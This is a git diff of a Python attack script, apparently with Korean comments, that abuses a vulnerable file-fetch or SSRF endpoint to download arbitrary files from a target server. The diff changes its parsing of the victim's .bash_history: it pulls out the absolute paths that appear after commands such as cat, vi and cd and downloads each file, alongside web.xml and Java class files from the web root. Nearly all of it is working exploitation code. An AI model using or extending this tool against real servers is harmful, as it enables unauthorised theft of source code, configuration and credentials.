@@ -18,7 +18,7 @@ BASE_DIR = Path.cwd() / "extract"
 BASE_DIR.mkdir(parents=True, exist_ok=True)
 
 downloaded_file = []
-homeDir = ""
+homeDir = "" # ex) /home/test
 downloaded_class_list = []
 WebRoot = [] # ex) /storage/webapps/test/site
 
@@ -93,10 +93,10 @@ def download_File(path: str) -> bytes:
     if targetUrl_GET:
         params = {
 
-            "url": "file://" + path,
+            "url": path,
         }
         headers = {
-            "Cookies": "JESSIONS"
+            "Cookies": "JESSIONID"
         }
         response = requests.get(url=targetUrl_GET, params=params)
         downloaded_file.append(path)
@@ -114,7 +114,7 @@ def download_File(path: str) -> bytes:
 
         }
         headers = {
-            "Cookies": "JESSION"
+            "Cookies": "JESSIONID"
         }
         response.post(url=targetUrl_POST, data=data)
         downloaded_file.append(path)
@@ -151,12 +151,13 @@ def download_web_xml():
 
 
 def solve_Bash_History():
-    with open(BASE_DIR + homeDir + ".bash_history", "r") as f:
+    relativeHomeDir = homeDir.lstrip("/")
+    with open(BASE_DIR / relativeHomeDir / ".bash_history", "r") as f:
         for line in f:
 
             find_WebRoot(line)
 
-            # cd, vi, vim, nano, touch 로 시작하는 인자 중 절대경로 다운로드
+            # "cat ", "vi ", "vim ", "nano ", "touch "로 시작하는 인자 중 절대경로 다운로드
             if line.startswith(targets):
                 for target in targets:
                     if line.startswith(target):
@@ -183,11 +184,16 @@ def solve_Bash_History():
                     # 마지막에 / 있으면 스킵
                     if file_path.endswith('/'):
                         continue
+                    # cd 로 경로 이동한거면 디렉터리 생성 후 스킵
+                    elif line.startswith("cd "):
+                        local_dir = BASE_DIR / file_path.lstrip("/")
+                        local_dir.mkdir(parents=True, exist_ok=True)
+                        continue
                     result = download_File(file_path)
                     if result and (not download_Fail_byte or download_Fail_byte not in result):
                         mkFile(result, file_path)
             
-            # 즉시 실행 절대경로 파일 다운로드 ex) /opt/tomcat/test/catalina.sh
+            # 즉시 실행 절대경로 탐지 및 파일 다운로드 ex) /opt/tomcat/test/catalina.sh
             else:
                 matches = re.findall(r'(\.?/[\w/.-]+)', line)
                 for file_path in matches:
@@ -195,9 +201,15 @@ def solve_Bash_History():
                     filename = path_obj.name
                     if file_path.endswith('/') or not filename or filename == '/':
                         continue
+                    if line.startswith("cd "):
+                        print("find Absolute Path : " + file_path)
+                        continue
+                    
                     result = download_File(file_path)
                     if result and (not download_Fail_byte or download_Fail_byte not in result):
                         mkFile(result, file_path)
+
+    print("End .bash_history")
 
 
 # --class_file 로직
@@ -344,12 +356,10 @@ def main():
         if homeDir != "":
             solve_Bash_History()
             download_web_xml()
-            extract_download_path()
-            
+            # extract_download_path()
         else:
             print("Not Found .bash_history...")
-            # 추가 예정
-
+            # 다른 프레임워크 추가 예정
     else:
         print("[*] No passwd file provide...")
     
